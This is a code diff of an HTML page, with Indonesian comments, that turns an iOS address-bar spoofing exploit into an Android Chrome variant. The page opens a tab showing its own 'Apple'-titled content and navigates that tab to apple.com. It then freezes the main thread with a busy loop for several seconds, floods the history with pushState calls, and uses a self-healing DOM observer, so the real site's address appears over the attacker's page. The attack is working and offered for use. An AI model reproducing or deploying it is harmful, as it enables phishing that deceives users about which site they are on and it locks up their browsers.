@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Ultimate Indestructible Force Lock - HALLO</title>
+    <title>Android Ultimate Spoofing Chaining - HALLO</title>
     <style>
       body, html {
         margin: 0;
@@ -14,7 +14,7 @@
         height: 100%;
         background: #09090b;
         color: #fff;
-        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+        font-family: Roboto, sans-serif;
       }
       .container {
         display: flex;
@@ -27,45 +27,45 @@
         box-sizing: border-box;
       }
       h1 {
-        font-size: 22px;
+        font-size: 20px;
         margin-bottom: 10px;
         color: #f5f5f7;
         text-align: center;
       }
       button {
         width: 100%;
-        max-width: 420px;
-        padding: 24px;
-        font-size: 20px;
+        max-width: 400px;
+        py: 20px;
+        padding: 22px;
+        font-size: 18px;
         font-weight: bold;
-        background: #ff3b30;
+        background: #1a73e8;
         color: #fff;
         border: none;
-        border-radius: 16px;
+        border-radius: 12px;
         cursor: pointer;
-        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.45);
-        transition: transform 0.1s ease;
+        box-shadow: 0 4px 16px rgba(26, 115, 232, 0.4);
       }
       button:active {
-        transform: scale(0.96);
+        transform: scale(0.97);
       }
     </style>
   </head>
   <body>
     <div class="container">
-      <h1>Indestructible Spoofing Engine</h1>
-      <button id="startBtn">EXECUTE UNBREAKABLE LOCK</button>
+      <h1>Android Chrome Chain Spoofing</h1>
+      <button id="startBtn">EXECUTE ANDROID CHAIN LOCK</button>
     </div>
 
     <script>
       document.getElementById("startBtn").onclick = function () {
         this.style.display = 'none';
 
-        // 1. Membuka jendela baru secara instan
+        // 1. Membuka jendela baru menggunakan skema target terbuka
         const newTab = window.open("", "_blank");
 
         if (newTab) {
-          // 2. Menyuntikkan template dokumen HTML mandiri yang membawa script pertahanan mandiri (Self-Healing DOM)
+          // 2. Menyuntikkan DOM awal berisikan teks "HALLO" dan Self-Healing Mutation Watchdog
           newTab.document.write(`
             <!DOCTYPE html>
             <html>
@@ -73,17 +73,25 @@
               <title>Apple</title>
               <meta name="viewport" content="width=device-width, initial-scale=1">
             </head>
-            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
-              <h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
+            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:Roboto,sans-serif;">
+              <h1 id="spoof-text" style="font-size:80px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
               <script>
-                // Self-Healing Shield: Jika ada upaya pembersihan atau penimpaan elemen, langsung regenerasi paksa
+                // Rantai Pengaman 1: DOM Mutation Observer untuk mendeteksi perubahan struktur muatan
+                try {
+                  const observer = new MutationObserver(() => {
+                    if (!document.getElementById('spoof-text')) {
+                      document.body.innerHTML = '<h1 id="spoof-text" style="font-size:80px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
+                    }
+                  });
+                  observer.observe(document.documentElement, { childList: true, subtree: true });
+                } catch(e) {}
+
+                // Rantai Pengaman 2: History State Pollution berulang untuk membingungkan NavigationController Android
                 setInterval(() => {
-                  if (!document.getElementById('spoof-text') || document.body.innerText.trim() !== 'HALLO') {
-                    document.open();
-                    document.write('<!DOCTYPE html><html><head><title>Apple</title><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;"><h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1></body></html>');
-                    document.close();
-                  }
-                }, 5);
+                  try {
+                    history.pushState({lock: Math.random()}, "", "#secure-origin");
+                  } catch(e) {}
+                }, 10);
               <\/script>
             </body>
             </html>
@@ -92,32 +100,40 @@
 
           try { newTab.focus(); } catch (e) {}
 
-          // 3. Timing 1 (6ms): Memicu tarikan navigasi asinkron mutlak ke apple.com agar address bar berubah terpampang
+          // 3. Rantai Eksekusi Chaining Navigasi (Timing Presisi Tinggi untuk Android Chrome)
+          // Tahap A (10ms): Memicu history flooding di level window utama sebelum navigasi commit
+          setTimeout(() => {
+            try {
+              newTab.history.pushState({chain: 1}, "", "#spoof-init");
+            } catch (e) {}
+          }, 10);
+
+          // Tahap B (25ms): Menembak location.href ke apple.com untuk memaksa pembaruan Omnibox (Address Bar)
           setTimeout(() => {
             try {
               newTab.location.href = "https://apple.com";
             } catch (err) {}
-          }, 6);
+          }, 25);
 
-          // 4. Timing 2 (20ms): Mengunci main thread secara sinkronus untuk menahan antrean render pipeline pusat
+          // Tahap C (50ms): Membanjiri microtask queue dan event loop Chrome Android untuk menahan commit render frame
           setTimeout(() => {
             try {
               newTab.eval(`
-                const startTime = Date.now();
-                while (Date.now() - startTime < 7000) {
+                const start = Date.now();
+                while (Date.now() - start < 6000) {
+                  // Memaksa kalkulasi layout sinkronus berulang kali pada mesin Blink Android
                   const reflow = document.body.offsetHeight;
-                  document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fefefe';
+                  document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fafafa';
                   
                   if (!document.getElementById('spoof-text')) {
-                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
+                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:80px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
                   }
                 }
               `);
             } catch (e) {
-              let start = Date.now();
-              while (Date.now() - start < 7000) {}
+              let s = Date.now(); while(Date.now() - s < 6000) {}
             }
-          }, 20);
+          }, 50);
         }
       };
     </script>
